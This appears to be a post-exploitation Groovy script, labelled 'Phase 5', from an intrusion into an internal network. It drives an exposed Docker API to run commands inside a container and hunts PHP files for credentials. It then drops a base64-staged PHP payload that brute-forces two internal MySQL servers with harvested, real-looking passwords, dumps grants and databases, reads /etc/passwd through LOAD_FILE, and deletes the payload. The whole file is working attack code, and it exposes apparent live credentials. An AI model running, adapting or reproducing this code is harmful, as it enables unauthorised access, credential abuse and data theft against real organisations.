// Phase 5: Read existing PHP scripts + try direct auth with any creds found
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

println "===== READ EXISTING PHP SCRIPTS FOR CREDS ====="
// Read the first few php files that were found
["tq.php", "query.php", "q.php", "tqprod.php", "probe.php"].each { f ->
    println "--- /tmp/${f} ---"
    println execIn("head -30 /tmp/${f} 2>/dev/null || echo MISSING")
    println ""
}

println ""
println "===== CHECK MySQL CLIENT BINARY ====="
println execIn("find / -name 'mysql' -type f 2>/dev/null; find / -name 'mysql*' -path '*/bin/*' 2>/dev/null; ls /opt/rh/*/root/usr/bin/mysql* 2>/dev/null; ls /usr/bin/mysql* 2>/dev/null")

println ""
println "===== CHECK PHP PDO DRIVERS ====="
println execIn("php -m 2>/dev/null | grep -i -E 'mysql|pdo'")

println ""
println "===== PHP MYSQL SOCKET TEST WITH VARIOUS USERS ====="
// The error said access denied for 'apifincadodev'@'172.27.141.23'
// Let's check what users ARE allowed from 172.27.141.23 by reading the error messages carefully
def php = '''<?php
error_reporting(E_ALL);

// Extended cred list - try ALL possible users from various config files
$creds = array(
    // Original creds with different users
    array("apifincadodev", "nNzy]Ku2Ah=u%y1I"),
    array("apifincadob", "nNzy]Ku2Ah=u%y1I"),
    array("apifincado", "nNzy]Ku2Ah=u%y1I"),
    array("api_fincado", "nNzy]Ku2Ah=u%y1I"),
    array("fincado", "nNzy]Ku2Ah=u%y1I"),
    array("app_t1", "wUt22Us2CUh#+M="),
    
    // Dev-specific patterns
    array("apifincadodev", "apifincadodev"),
    array("devuser", "nNzy]Ku2Ah=u%y1I"),
    array("dev", "nNzy]Ku2Ah=u%y1I"),
    array("sears", "nNzy]Ku2Ah=u%y1I"),
    array("searsdev", "nNzy]Ku2Ah=u%y1I"),
    array("claroshop", "nNzy]Ku2Ah=u%y1I"),
    
    // Jenkins creds reuse
    array("root", "e6LBqIkOI\\$PR1XX2oia"),
    array("root", "JenkisLegasy25"),
    array("root", "dtvV50vwfGq5CO9"),
    array("root", "nNzy]Ku2Ah=u%y1I"),
    array("root", "plug*spoke!MosqueCloud3col"),
    array("jenkins", "e6LBqIkOI\\$PR1XX2oia"),
    array("sophia-mrk-i", "plug*spoke!MosqueCloud3col"),
    
    // % wildcard user patterns
    array("admin", "admin"),
    array("test", "test"),
    array("read", "read"),
    array("readonly", "readonly"),
    array("backup", "backup"),
    array("repl", "repl"),
    array("slave", "slave"),
    array("monitor", "monitor"),
);

$hosts = array(
    array("DEV_SEARS", "172.27.141.6", 3308),
    array("T1PAGOS",   "172.27.141.4", 3306),
);

foreach ($hosts as $h) {
    list($label, $host, $port) = $h;
    echo "\\n=== $label ($host:$port) ===\\n";
    foreach ($creds as $c) {
        list($user, $pass) = $c;
        try {
            $pdo = new PDO("mysql:host=$host;port=$port", $user, $pass, array(
                PDO::ATTR_TIMEOUT => 3,
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
            ));
            echo "*** AUTH_OK *** $user : $pass\\n";
            foreach ($pdo->query("SELECT VERSION() v, CURRENT_USER() cu, @@hostname hn") as $r) {
                echo "  VER=".$r["v"]." CU=".$r["cu"]." HN=".$r["hn"]."\\n";
            }
            echo "  GRANTS:\\n";
            foreach ($pdo->query("SHOW GRANTS FOR CURRENT_USER()") as $r) {
                echo "    ".$r[0]."\\n";
            }
            echo "  DBS:\\n";
            foreach ($pdo->query("SHOW DATABASES") as $r) {
                echo "    ".$r[0]."\\n";
            }
            echo "  SECURE_FILE_PRIV:\\n";
            foreach ($pdo->query("SELECT @@secure_file_priv sfp, @@plugin_dir pd") as $r) {
                echo "    SFP=".$r["sfp"]." PD=".$r["pd"]."\\n";
            }
            // load_file test
            $res = $pdo->query("SELECT LOAD_FILE('/etc/passwd') AS f");
            $row = $res->fetch();
            if ($row["f"]) {
                echo "  FILE_PRIV=YES\\n";
                echo "  /etc/passwd (first 500 bytes):\\n".substr($row["f"],0,500)."\\n";
            } else {
                echo "  FILE_PRIV=NO\\n";
            }
            break; // found valid creds for this host
        } catch (Exception $e) {
            $msg = $e->getMessage();
            if (strpos($msg, "Access denied") === false) {
                // Not auth error - connection issue, skip host
                echo "CONN_ERR|$user|$msg\\n";
                break;
            }
            // else just access denied, try next
        }
    }
}
echo "\\nDONE\\n";
'''
def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p5.php && php /tmp/_p5.php 2>&1; rm -f /tmp/_p5.php"
println execIn(cmd)
